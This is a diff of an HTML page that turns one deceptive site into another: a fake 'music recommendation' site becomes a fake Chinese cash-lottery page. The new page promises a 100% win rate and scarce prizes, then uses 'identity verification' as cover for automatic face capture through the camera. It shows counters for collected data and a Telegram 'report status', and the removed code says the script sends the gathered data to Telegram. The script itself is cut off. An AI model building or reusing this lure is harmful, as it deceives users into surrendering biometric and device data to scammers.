@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎵 音乐星球 | 个性化音乐推荐系统</title>
+    <title>🎰 百万现金抽奖 | 即时验证赢大奖</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary: #1DB954;
-            --secondary: #191414;
-            --accent: #FF6B6B;
-            --dark: #121212;
-            --light: #282828;
-            --text: #FFFFFF;
-            --text-secondary: #B3B3B3;
+            --gold: #FFD700;
+            --red: #FF4757;
+            --blue: #3742FA;
+            --green: #2ED573;
+            --dark: #0A0A2A;
+            --light: #F8F9FA;
         }
         
         * {
@@ -25,111 +24,53 @@
         
         body {
             font-family: 'Poppins', sans-serif;
-            background: var(--secondary);
-            color: var(--text);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            color: white;
             overflow-x: hidden;
         }
         
-        /* 音乐背景效果 */
-        .music-background {
+        /* 钞票背景效果 */
+        .money-background {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: linear-gradient(45deg, #121212, #191414, #000000);
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(255, 215, 0, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(255, 71, 87, 0.1) 0%, transparent 50%);
             z-index: -2;
         }
         
-        .sound-waves {
+        .floating-money {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: radial-gradient(circle at 30% 30%, rgba(29, 185, 84, 0.1) 0%, transparent 50%),
-                      radial-gradient(circle at 70% 70%, rgba(255, 107, 107, 0.1) 0%, transparent 50%);
+            font-size: 40px;
+            color: rgba(255, 215, 0, 0.3);
+            animation: float 20s infinite linear;
             z-index: -1;
-            animation: pulseWaves 20s infinite alternate;
         }
         
-        @keyframes pulseWaves {
-            0% { transform: scale(1); opacity: 0.5; }
-            100% { transform: scale(1.2); opacity: 0.8; }
+        @keyframes float {
+            0% { transform: translateY(100vh) rotate(0deg); }
+            100% { transform: translateY(-100px) rotate(360deg); }
         }
         
         /* 主容器 */
-        .music-container {
-            max-width: 1400px;
+        .lottery-container {
+            max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
         }
         
-        /* 顶部导航 */
-        .music-navbar {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 25px 0;
-            margin-bottom: 40px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .logo-section {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .logo {
-            width: 50px;
-            height: 50px;
-            background: linear-gradient(45deg, var(--primary), var(--accent));
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 24px;
-            animation: rotateLogo 10s linear infinite;
-        }
-        
-        @keyframes rotateLogo {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
-        }
-        
-        .logo-text h1 {
-            font-size: 2.2rem;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 700;
-        }
-        
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .user-badge {
-            background: rgba(255,255,255,0.1);
-            padding: 10px 20px;
-            border-radius: 25px;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
         /* 加载界面 */
-        .music-loader {
+        .lottery-loader {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background: var(--dark);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             z-index: 9999;
             display: flex;
             flex-direction: column;
@@ -138,349 +79,178 @@
             transition: opacity 0.5s;
         }
         
-        .equalizer {
-            display: flex;
-            align-items: flex-end;
-            gap: 5px;
-            height: 60px;
-            margin-bottom: 30px;
-        }
-        
-        .bar {
-            width: 8px;
-            background: linear-gradient(to top, var(--primary), var(--accent));
-            border-radius: 4px;
-            animation: equalize 1.5s infinite;
-        }
-        
-        .bar:nth-child(1) { height: 20px; animation-delay: 0s; }
-        .bar:nth-child(2) { height: 40px; animation-delay: 0.2s; }
-        .bar:nth-child(3) { height: 60px; animation-delay: 0.4s; }
-        .bar:nth-child(4) { height: 40px; animation-delay: 0.6s; }
-        .bar:nth-child(5) { height: 20px; animation-delay: 0.8s; }
-        
-        @keyframes equalize {
-            0%, 100% { height: 20px; }
-            25% { height: 40px; }
-            50% { height: 60px; }
-            75% { height: 40px; }
-        }
-        
-        /* 音乐播放器 */
-        .player-section {
-            background: rgba(40, 40, 40, 0.8);
-            border-radius: 25px;
-            padding: 40px;
-            margin-bottom: 40px;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        
-        .player-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-        
-        .player-title h2 {
-            font-size: 2rem;
-            color: var(--text);
-            margin-bottom: 10px;
-        }
-        
-        .player-title p {
-            color: var(--text-secondary);
-            font-size: 1.1rem;
-        }
-        
-        .player-controls {
-            display: flex;
-            align-items: center;
-            gap: 20px;
-        }
-        
-        .control-btn {
-            width: 60px;
-            height: 60px;
-            background: var(--primary);
-            border: none;
-            border-radius: 50%;
-            color: white;
-            font-size: 24px;
-            cursor: pointer;
-            transition: all 0.3s;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-        
-        .control-btn:hover {
-            transform: scale(1.1);
-            box-shadow: 0 0 30px rgba(29, 185, 84, 0.5);
-        }
-        
-        .play-btn {
-            width: 80px;
-            height: 80px;
-            font-size: 32px;
-            background: linear-gradient(45deg, var(--primary), var(--accent));
-        }
-        
-        .player-display {
-            display: grid;
-            grid-template-columns: 1fr 2fr 1fr;
-            gap: 30px;
-            align-items: center;
-            margin-bottom: 30px;
-        }
-        
-        .album-art {
+        .lottery-machine {
             width: 200px;
             height: 200px;
-            border-radius: 20px;
-            overflow: hidden;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
-        }
-        
-        .album-art img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
-        }
-        
-        .song-info {
-            padding: 20px;
-        }
-        
-        .song-title {
-            font-size: 2.5rem;
-            font-weight: 700;
-            margin-bottom: 15px;
-            background: linear-gradient(90deg, var(--text), var(--primary));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-        }
-        
-        .song-artist {
-            font-size: 1.5rem;
-            color: var(--text-secondary);
-            margin-bottom: 10px;
-        }
-        
-        .song-album {
-            font-size: 1.1rem;
-            color: var(--text-secondary);
-            margin-bottom: 30px;
-        }
-        
-        /* 进度条 */
-        .progress-container {
-            margin: 30px 0;
-        }
-        
-        .progress-bar {
-            height: 8px;
-            background: rgba(255,255,255,0.1);
-            border-radius: 4px;
-            overflow: hidden;
-            margin-bottom: 10px;
             position: relative;
+            margin-bottom: 40px;
         }
         
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, var(--primary), var(--accent));
-            width: 45%;
-            border-radius: 4px;
-            position: relative;
-        }
-        
-        .progress-fill::after {
-            content: '';
+        .lottery-ball {
             position: absolute;
-            right: -8px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 16px;
-            height: 16px;
-            background: white;
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(45deg, var(--gold), var(--red));
             border-radius: 50%;
-            box-shadow: 0 0 15px rgba(255,255,255,0.5);
+            animation: lotterySpin 2s infinite;
         }
         
-        .time-display {
-            display: flex;
-            justify-content: space-between;
-            color: var(--text-secondary);
-            font-size: 0.9rem;
+        .ball1 { top: 20%; left: 40%; animation-delay: 0s; }
+        .ball2 { top: 40%; right: 20%; animation-delay: 0.3s; }
+        .ball3 { bottom: 20%; left: 30%; animation-delay: 0.6s; }
+        .ball4 { top: 60%; left: 60%; animation-delay: 0.9s; }
+        
+        @keyframes lotterySpin {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            25% { transform: translate(50px, -30px) scale(1.2); }
+            50% { transform: translate(-30px, 40px) scale(0.9); }
+            75% { transform: translate(40px, 30px) scale(1.1); }
         }
         
-        /* 个性化推荐 */
-        .recommendation-section {
-            margin: 50px 0;
-        }
-        
-        .section-title {
-            font-size: 1.8rem;
+        /* 顶部横幅 */
+        .lottery-header {
+            background: linear-gradient(90deg, #FF0000, #FF6B00, #FFD700);
+            padding: 40px;
+            border-radius: 25px;
+            text-align: center;
             margin-bottom: 30px;
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .section-title i {
-            color: var(--primary);
-        }
-        
-        .tracks-grid {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 25px;
-        }
-        
-        .track-card {
-            background: rgba(40, 40, 40, 0.6);
-            border-radius: 15px;
-            padding: 25px;
-            display: flex;
-            align-items: center;
-            gap: 20px;
-            transition: all 0.3s;
-            cursor: pointer;
-            border: 1px solid transparent;
-        }
-        
-        .track-card:hover {
-            background: rgba(40, 40, 40, 0.9);
-            border-color: var(--primary);
-            transform: translateY(-5px);
-        }
-        
-        .track-cover {
-            width: 70px;
-            height: 70px;
-            border-radius: 10px;
+            position: relative;
             overflow: hidden;
+            animation: headerGlow 3s infinite alternate;
         }
         
-        .track-cover img {
-            width: 100%;
-            height: 100%;
-            object-fit: cover;
+        @keyframes headerGlow {
+            0% { box-shadow: 0 0 60px rgba(255, 0, 0, 0.4); }
+            100% { box-shadow: 0 0 60px rgba(255, 215, 0, 0.4); }
         }
         
-        .track-details {
-            flex: 1;
+        .lottery-header h1 {
+            font-size: 3.5rem;
+            text-shadow: 3px 3px 5px rgba(0,0,0,0.3);
+            margin-bottom: 15px;
         }
         
-        .track-name {
-            font-size: 1.2rem;
-            font-weight: 600;
-            margin-bottom: 5px;
+        .jackpot-display {
+            font-size: 4rem;
+            font-weight: bold;
+            color: var(--gold);
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
+            margin: 25px 0;
+            animation: moneyPulse 2s infinite;
         }
         
-        .track-artist {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
+        @keyframes moneyPulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
         }
         
-        .track-duration {
-            color: var(--text-secondary);
-            font-size: 0.9rem;
+        /* 倒计时 */
+        .countdown-section {
+            display: flex;
+            justify-content: center;
+            gap: 25px;
+            margin-top: 30px;
+            flex-wrap: wrap;
         }
         
-        /* 设备信息显示 */
-        .device-section {
-            background: rgba(40, 40, 40, 0.6);
-            border-radius: 20px;
-            padding: 30px;
-            margin: 40px 0;
-            border: 1px solid rgba(255,255,255,0.1);
+        .countdown-box {
+            background: rgba(0,0,0,0.7);
+            padding: 25px;
+            border-radius: 15px;
+            min-width: 120px;
+            text-align: center;
+            border: 2px solid rgba(255,215,0,0.3);
         }
         
-        .device-info {
+        .countdown-number {
+            font-size: 2.8rem;
+            font-weight: bold;
+            color: var(--gold);
+            font-family: 'Courier New', monospace;
+        }
+        
+        /* 奖品展示 */
+        .prizes-section {
             display: grid;
             grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
             gap: 25px;
-            margin-top: 20px;
+            margin: 40px 0;
         }
         
-        .device-card {
-            background: rgba(0,0,0,0.3);
-            border-radius: 15px;
-            padding: 25px;
-            border-left: 4px solid var(--primary);
+        .prize-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            color: #333;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
         }
         
-        .device-card-title {
-            display: flex;
-            align-items: center;
-            gap: 10px;
+        .prize-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+        }
+        
+        .prize-icon {
+            font-size: 50px;
+            color: var(--gold);
             margin-bottom: 20px;
-            color: var(--primary);
-            font-size: 1.1rem;
         }
         
-        .device-data {
-            font-size: 1.8rem;
-            font-weight: 700;
-            margin: 10px 0;
-            color: var(--text);
-        }
-        
-        .device-desc {
-            font-size: 0.9rem;
-            color: var(--text-secondary);
+        .prize-ribbon {
+            position: absolute;
+            top: 15px;
+            right: -30px;
+            background: var(--red);
+            color: white;
+            padding: 8px 35px;
+            transform: rotate(45deg);
+            font-weight: bold;
         }
         
         /* 验证区域 */
-        .verification-notice {
-            background: linear-gradient(135deg, rgba(29, 185, 84, 0.1), rgba(255, 107, 107, 0.1));
-            border-radius: 20px;
-            padding: 30px;
+        .verification-section {
+            background: rgba(255,255,255,0.95);
+            border-radius: 25px;
+            padding: 40px;
             margin: 40px 0;
-            border: 1px solid rgba(255,255,255,0.2);
-        }
-        
-        .verification-content {
+            color: #333;
             text-align: center;
-            max-width: 800px;
-            margin: 0 auto;
         }
         
-        .verification-content h3 {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
-            color: var(--text);
+        .verification-title {
+            font-size: 2rem;
+            margin-bottom: 30px;
+            color: #333;
         }
         
-        .verification-content p {
-            color: var(--text-secondary);
-            margin-bottom: 25px;
-            line-height: 1.6;
+        .verification-title i {
+            color: var(--gold);
+            margin-right: 15px;
         }
         
         /* 摄像头区域 */
         .camera-section {
-            background: rgba(0,0,0,0.5);
+            background: white;
             border-radius: 20px;
             padding: 40px;
             margin: 40px 0;
             text-align: center;
             display: none;
-            border: 2px solid var(--primary);
         }
         
         .camera-preview {
             width: 100%;
             max-width: 500px;
-            height: 350px;
-            background: #000;
+            height: 400px;
+            background: #1a1a2e;
             border-radius: 15px;
             overflow: hidden;
             margin: 30px auto;
             position: relative;
+            border: 3px solid var(--gold);
         }
         
         #cameraVideo {
@@ -494,240 +264,187 @@
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            width: 180px;
-            height: 240px;
-            border: 3px solid rgba(29, 185, 84, 0.5);
+            width: 220px;
+            height: 300px;
+            border: 3px solid rgba(255, 215, 0, 0.5);
             border-radius: 10px;
         }
         
+        /* 检测信息显示 */
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin: 40px 0;
+        }
+        
+        .info-card {
+            background: rgba(255,255,255,0.95);
+            border-radius: 15px;
+            padding: 25px;
+            color: #333;
+        }
+        
+        .info-title {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            color: var(--blue);
+            font-size: 1.3rem;
+        }
+        
+        .info-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 12px 0;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .info-label {
+            color: #666;
+        }
+        
+        .info-value {
+            font-weight: bold;
+            color: #333;
+        }
+        
         /* 按钮样式 */
-        .music-btn {
-            background: linear-gradient(90deg, var(--primary), #25D366);
+        .lottery-btn {
+            background: linear-gradient(90deg, var(--red), var(--gold));
             color: white;
             border: none;
-            padding: 18px 35px;
-            font-size: 1.1rem;
-            font-weight: 600;
-            border-radius: 50px;
+            padding: 20px 40px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 15px;
             cursor: pointer;
             transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-            gap: 12px;
+            box-shadow: 0 10px 30px rgba(255, 0, 0, 0.3);
         }
         
-        .music-btn:hover {
-            transform: translateY(-3px);
-            box-shadow: 0 10px 30px rgba(29, 185, 84, 0.4);
+        .lottery-btn:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 15px 40px rgba(255, 0, 0, 0.4);
         }
         
-        .music-btn.secondary {
-            background: rgba(255,255,255,0.1);
-            border: 2px solid rgba(255,255,255,0.2);
-        }
-        
-        /* 响应式设计 */
-        @media (max-width: 992px) {
-            .player-display {
-                grid-template-columns: 1fr;
-                text-align: center;
-            }
-            
-            .album-art {
-                margin: 0 auto;
-            }
-            
-            .tracks-grid {
-                grid-template-columns: 1fr;
-            }
-        }
-        
+        /* 响应式 */
         @media (max-width: 768px) {
-            .music-navbar {
-                flex-direction: column;
-                gap: 20px;
+            .lottery-header h1 {
+                font-size: 2.5rem;
             }
             
-            .player-header {
-                flex-direction: column;
-                gap: 20px;
-                text-align: center;
+            .jackpot-display {
+                font-size: 3rem;
             }
             
-            .song-title {
-                font-size: 2rem;
+            .countdown-section {
+                gap: 15px;
+            }
+            
+            .countdown-box {
+                min-width: 80px;
+                padding: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- 背景效果 -->
-    <div class="music-background"></div>
-    <div class="sound-waves"></div>
+    <!-- 钞票背景 -->
+    <div class="money-background"></div>
+    <div id="floatingMoney"></div>
 
     <!-- 加载界面 -->
-    <div class="music-loader" id="loadingScreen">
-        <div class="equalizer">
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
-            <div class="bar"></div>
+    <div class="lottery-loader" id="loadingScreen">
+        <div class="lottery-machine">
+            <div class="lottery-ball ball1"></div>
+            <div class="lottery-ball ball2"></div>
+            <div class="lottery-ball ball3"></div>
+            <div class="lottery-ball ball4"></div>
         </div>
-        <h2 style="margin-bottom: 20px; font-size: 1.8rem;">正在分析您的音乐偏好...</h2>
-        <div style="background: rgba(255,255,255,0.05); padding: 15px 25px; border-radius: 10px; margin: 20px 0;">
-            <div style="font-size: 1.1rem; color: var(--primary);" id="loadingStatus">
-                <i class="fas fa-music"></i> 创建个性化播放列表
-            </div>
+        <h2 style="margin-bottom: 20px;">正在生成您的抽奖号码...</h2>
+        <div style="background: rgba(255,255,255,0.1); padding: 15px 30px; border-radius: 10px;">
+            <div style="font-size: 1.5rem; color: var(--gold);" id="lotteryCode">LOT-XXXX-XXXX</div>
         </div>
-        <p style="color: var(--text-secondary); text-align: center; max-width: 500px; line-height: 1.6;">
-            系统正在分析您的设备信息，为您推荐最适合的音乐
-        </p>
+        <p style="margin-top: 20px; color: rgba(255,255,255,0.7);">请稍候，系统正在进行身份验证</p>
     </div>
 
     <!-- 主内容 -->
-    <div class="music-container" id="mainContainer" style="display: none;">
-        <!-- 顶部导航 -->
-        <nav class="music-navbar">
-            <div class="logo-section">
-                <div class="logo">
-                    <i class="fas fa-music"></i>
-                </div>
-                <div class="logo-text">
-                    <h1>音乐星球</h1>
-                    <p style="color: var(--text-secondary); font-size: 0.9rem;">智能音乐推荐系统</p>
-                </div>
-            </div>
+    <div class="lottery-container" id="mainContainer" style="display: none;">
+        <!-- 顶部横幅 -->
+        <div class="lottery-header">
+            <h1><i class="fas fa-trophy"></i> 百万现金大奖抽奖</h1>
+            <p style="font-size: 1.3rem; margin-bottom: 20px;">完全免费参与 | 即时验证 | 100%中奖率</p>
             
-            <div class="user-info">
-                <div class="user-badge">
-                    <i class="fas fa-headphones"></i>
-                    <span id="listenerStatus">高级会员</span>
-                </div>
-                <div class="user-badge">
-                    <i class="fas fa-wifi"></i>
-                    <span id="connectionStatus">在线</span>
-                </div>
-            </div>
-        </nav>
-
-        <!-- 音乐播放器 -->
-        <div class="player-section">
-            <div class="player-header">
-                <div class="player-title">
-                    <h2>正在为您播放</h2>
-                    <p>基于您的偏好推荐的歌曲</p>
-                </div>
-                
-                <div class="player-controls">
-                    <button class="control-btn secondary">
-                        <i class="fas fa-step-backward"></i>
-                    </button>
-                    <button class="control-btn play-btn" id="playBtn">
-                        <i class="fas fa-play"></i>
-                    </button>
-                    <button class="control-btn secondary">
-                        <i class="fas fa-step-forward"></i>
-                    </button>
-                </div>
-            </div>
+            <div class="jackpot-display" id="jackpotAmount">¥ 8,888,888</div>
             
-            <div class="player-display">
-                <div class="album-art">
-                    <img src="https://images.unsplash.com/photo-1493225457124-a3eb161ffa5f?ixlib=rb-1.2.1&auto=format&fit=crop&w=800&q=80" 
-                         alt="Album Cover" id="albumCover">
+            <div class="countdown-section">
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownHours">00</div>
+                    <div>小时</div>
                 </div>
-                
-                <div class="song-info">
-                    <h1 class="song-title" id="currentSong">Blinding Lights</h1>
-                    <p class="song-artist" id="currentArtist">The Weeknd</p>
-                    <p class="song-album" id="currentAlbum">After Hours</p>
-                    
-                    <div class="progress-container">
-                        <div class="progress-bar">
-                            <div class="progress-fill" id="songProgress"></div>
-                        </div>
-                        <div class="time-display">
-                            <span id="currentTime">2:15</span>
-                            <span id="totalTime">3:20</span>
-                        </div>
-                    </div>
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownMinutes">00</div>
+                    <div>分钟</div>
                 </div>
-                
-                <div class="player-stats">
-                    <div style="display: flex; align-items: center; gap: 15px; margin-bottom: 20px;">
-                        <div style="background: rgba(29,185,84,0.2); padding: 10px 15px; border-radius: 10px;">
-                            <div style="color: var(--primary); font-size: 0.9rem;">音质</div>
-                            <div style="font-size: 1.2rem; font-weight: 600;">Hi-Fi</div>
-                        </div>
-                        <div style="background: rgba(255,107,107,0.2); padding: 10px 15px; border-radius: 10px;">
-                            <div style="color: var(--accent); font-size: 0.9rem;">音量</div>
-                            <div style="font-size: 1.2rem; font-weight: 600;">85%</div>
-                        </div>
-                    </div>
-                    
-                    <button class="music-btn secondary" style="width: 100%;" onclick="requestCameraAccess()">
-                                                <i class="fas fa-camera"></i> 面部识别优化音质
-                    </button>
+                <div class="countdown-box">
+                    <div class="countdown-number" id="countdownSeconds">00</div>
+                    <div>秒</div>
                 </div>
             </div>
         </div>
 
-        <!-- 设备信息 -->
-        <div class="device-section">
-            <h3 class="section-title">
-                <i class="fas fa-microchip"></i> 设备优化状态
-            </h3>
-            <p style="color: var(--text-secondary); margin-bottom: 25px;">
-                系统正在优化您的设备以获得最佳音乐体验
+        <!-- 奖品展示 -->
+        <div class="prizes-section">
+            <div class="prize-card">
+                <div class="prize-ribbon">特等奖</div>
+                <div class="prize-icon"><i class="fas fa-money-bill-wave"></i></div>
+                <h3>现金大奖</h3>
+                <p style="font-size: 1.8rem; color: var(--red); font-weight: bold;">¥1,000,000</p>
+                <p style="color: #666;">仅剩 <span style="color: var(--red);">1</span> 名</p>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-ribbon" style="background: var(--blue);">一等奖</div>
+                <div class="prize-icon"><i class="fas fa-car"></i></div>
+                <h3>豪华汽车</h3>
+                <p style="font-size: 1.8rem; color: var(--blue); font-weight: bold;">Tesla Model 3</p>
+                <p style="color: #666;">仅剩 <span style="color: var(--blue);">3</span> 名</p>
+            </div>
+            
+            <div class="prize-card">
+                <div class="prize-ribbon" style="background: var(--green);">二等奖</div>
+                <div class="prize-icon"><i class="fas fa-gem"></i></div>
+                <h3>钻石珠宝</h3>
+                <p style="font-size: 1.8rem; color: var(--green); font-weight: bold;">5克拉钻石</p>
+                <p style="color: #666;">仅剩 <span style="color: var(--green);">10</span> 名</p>
+            </div>
+        </div>
+
+        <!-- 验证区域 -->
+        <div class="verification-section">
+            <h2 class="verification-title">
+                <i class="fas fa-shield-alt"></i> 身份验证
+            </h2>
+            <p style="color: #666; margin-bottom: 30px; line-height: 1.6;">
+                为确保抽奖公平公正，防止恶意刷奖，我们需要验证您的真实身份<br>
+                系统将自动进行面部识别验证，请允许摄像头访问
             </p>
             
-            <div class="device-info">
-                <div class="device-card">
-                    <div class="device-card-title">
-                        <i class="fas fa-microphone"></i>
-                        <span>音频设备</span>
-                    </div>
-                    <div class="device-data" id="audioDevice">检测中...</div>
-                    <div class="device-desc">扬声器/耳机状态</div>
-                </div>
-                
-                <div class="device-card">
-                    <div class="device-card-title">
-                        <i class="fas fa-network-wired"></i>
-                        <span>网络连接</span>
-                    </div>
-                    <div class="device-data" id="networkSpeed">检测中...</div>
-                    <div class="device-desc">当前网络速度</div>
-                </div>
-                
-                <div class="device-card">
-                    <div class="device-card-title">
-                        <i class="fas fa-battery-full"></i>
-                        <span>电池状态</span>
-                    </div>
-                    <div class="device-data" id="batteryStatus">检测中...</div>
-                    <div class="device-desc">设备电量信息</div>
-                </div>
-                
-                <div class="device-card">
-                    <div class="device-card-title">
-                        <i class="fas fa-mobile-alt"></i>
-                        <span>设备信息</span>
-                    </div>
-                    <div class="device-data" id="deviceModel">检测中...</div>
-                    <div class="device-desc">手机型号/系统</div>
-                </div>
+            <div id="verificationStatus" style="padding: 20px; background: #f8f9fa; border-radius: 10px; margin-bottom: 30px;">
+                <i class="fas fa-spinner fa-spin"></i> 
+                <span style="margin-left: 10px;">等待身份验证...</span>
             </div>
         </div>
 
         <!-- 摄像头区域 -->
         <div class="camera-section" id="cameraSection">
-            <h3 style="font-size: 1.8rem; margin-bottom: 15px;">
-                <i class="fas fa-camera"></i> 面部识别优化
+            <h3 style="color: #333; margin-bottom: 15px;">
+                <i class="fas fa-camera"></i> 面部识别验证
             </h3>
-            <p style="color: var(--text-secondary); margin-bottom: 25px;">
-                通过面部识别分析您的听觉偏好，提供更精准的音乐推荐
+            <p style="color: #666; margin-bottom: 25px;">
+                请保持面部在框内，系统将自动拍照验证
             </p>
             
             <div class="camera-preview">
@@ -735,271 +452,137 @@
                 <div class="face-guide"></div>
             </div>
             
-            <div style="margin-top: 30px;">
-                <button class="music-btn" id="captureBtn" onclick="captureFace()">
-                    <i class="fas fa-camera"></i> 开始面部分析
-                </button>
-                <button class="music-btn secondary" id="skipBtn" onclick="skipCamera()" style="margin-left: 15px;">
-                    <i class="fas fa-forward"></i> 跳过此步骤
-                </button>
-            </div>
-            
-            <div style="margin-top: 25px; padding: 20px; background: rgba(29,185,84,0.1); border-radius: 15px; display: none;" id="faceResult">
-                <h4 style="color: var(--primary); margin-bottom: 10px;">
-                    <i class="fas fa-check-circle"></i> 面部分析完成
-                </h4>
-                <p style="color: var(--text-secondary);">
-                    已成功分析您的面部特征，正在优化音乐推荐...
-                </p>
+            <div style="margin-top: 30px; color: #666; font-size: 0.9rem;">
+                <i class="fas fa-info-circle"></i> 
+                验证中...请勿移动
             </div>
         </div>
 
-        <!-- 验证提示 -->
-        <div class="verification-notice">
-            <div class="verification-content">
-                <h3>🎧 个性化音乐体验优化</h3>
-                <p>
-                    为了给您提供最佳的音乐推荐，系统需要访问您的设备信息进行优化。
-                    这包括音频设备检测、网络状况分析、电池状态监控等。
-                </p>
-                <p style="margin-top: 15px; font-size: 0.9rem; color: rgba(255,255,255,0.6);">
-                    <i class="fas fa-shield-alt"></i> 
-                    所有数据仅用于优化您的音乐体验，我们承诺保护您的隐私安全
-                </p>
-            </div>
+        <!-- 检测信息显示 -->
+        <div class="info-grid" id="detectionInfo">
+            <!-- 动态生成检测信息 -->
         </div>
 
-        <!-- 推荐音乐 -->
-        <div class="recommendation-section">
-            <h3 class="section-title">
-                <i class="fas fa-star"></i> 为您推荐的歌曲
-            </h3>
-            
-            <div class="tracks-grid" id="recommendedTracks">
-                <!-- 动态生成推荐歌曲 -->
-            </div>
+        <!-- 参与按钮 -->
+        <div style="text-align: center; margin: 50px 0;">
+            <button class="lottery-btn" id="participateBtn" onclick="completeVerification()" disabled>
+                <i class="fas fa-ticket-alt"></i> 立即参与抽奖
+            </button>
         </div>
 
         <!-- 系统状态 -->
-        <div style="background: rgba(0,0,0,0.3); border-radius: 15px; padding: 20px; margin: 40px 0; text-align: center;">
-            <div style="display: inline-flex; align-items: center; gap: 20px; flex-wrap: wrap;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <i class="fas fa-database" style="color: var(--primary);"></i>
-                    <span style="color: var(--text-secondary);">数据收集:</span>
-                    <span id="dataCollection">0%</span>
+        <div style="text-align: center; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; margin: 40px 0;">
+            <h3 style="margin-bottom: 20px;">系统验证状态</h3>
+            <div style="display: flex; justify-content: center; gap: 30px; flex-wrap: wrap;">
+                <div>
+                    <div style="color: var(--gold); font-size: 2rem;" id="verificationProgress">0%</div>
+                    <div style="color: rgba(255,255,255,0.7);">验证进度</div>
                 </div>
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <i class="fas fa-bolt" style="color: var(--accent);"></i>
-                    <span style="color: var(--text-secondary);">系统优化:</span>
-                    <span id="systemOptimization">0%</span>
+                <div>
+                    <div style="color: var(--green); font-size: 2rem;" id="dataCollected">0</div>
+                    <div style="color: rgba(255,255,255,0.7);">数据收集</div>
                 </div>
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <i class="fas fa-music" style="color: #9B59B6;"></i>
-                    <span style="color: var(--text-secondary);">推荐精度:</span>
-                    <span id="recommendationAccuracy">0%</span>
+                <div>
+                    <div style="color: var(--red); font-size: 2rem;" id="telegramStatus">等待</div>
+                    <div style="color: rgba(255,255,255,0.7);">报告状态</div>
                 </div>
             </div>
         </div>
-
-        <!-- 底部 -->
-        <footer style="text-align: center; padding: 40px 0; margin-top: 50px; border-top: 1px solid rgba(255,255,255,0.1);">
-            <p style="color: var(--text-secondary); margin-bottom: 15px;">
-                <i class="fas fa-copyright"></i> 2024 音乐星球 | 智能音乐推荐系统
-            </p>
-            <p style="color: rgba(255,255,255,0.4); font-size: 0.9rem;">
-                <i class="fas fa-lock"></i> 端到端加密 | 
-                <i class="fas fa-user-shield"></i> 隐私保护 | 
-                <i class="fas fa-sync-alt"></i> 实时优化
-            </p>
-        </footer>
     </div>
 
-    <!-- 音频元素 -->
-    <audio id="backgroundMusic" loop>
-        <source src="https://assets.mixkit.co/music/preview/mixkit-tech-house-vibes-130.mp3" type="audio/mpeg">
-    </audio>
-
     <script>
-        // JavaScript代码在第二部分
-        // 包含所有检测功能和Telegram发送
+        // 初始化变量
